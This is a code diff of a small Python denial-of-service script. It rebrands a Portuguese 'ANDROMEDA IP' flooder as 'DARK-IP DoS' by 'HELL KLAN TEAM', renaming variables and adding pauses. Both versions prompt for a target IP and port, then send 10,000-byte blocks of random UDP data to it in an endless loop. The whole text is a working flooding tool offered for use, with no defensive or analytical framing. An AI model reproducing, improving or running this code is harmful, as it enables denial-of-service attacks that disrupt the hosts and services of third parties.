@@ -1,26 +1,25 @@
 import os
 import socket
-import random
 import time
-
+import random
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(10000)
 timeout = time.time()
+bytes = random._urandom(10000)
 os.system("clear")
-os.system("figlet ANDROMEDA IP")
-print("""
-Coded By Andromeda, Não Kibar, Ok? =P
-Usar portas TCP no Ataque""")
+os.system("figlet DARK-IP DoS")
+time.sleep(1)
+print("DARK-Ip DoS'ing Tool by HELL KLAN TEAM")
 print()
-Ip = input("Target IP: ")
-Porta = int(input("Target Port: "))
+time.sleep(1)
+IP = input("Target IP: ")
+Port = int(input("Target Port: "))
 while True:
     while 1:
        if time.time() > timeout:
            break
        else:
          pass
-    sock.sendto(bytes, (Ip, Porta))
-    print("Ataque sendo enviado, para parar aperte ctrl c")
-    if Porta == 65500:
-     Porta = 1
+    sock.sendto(bytes, (IP, Port))
+    print("SENDING ATTACK BY HELL KLAN KORPS! TO STOP PRESS CTRL + C")
+    if Port == 65500:
+     Port = 1
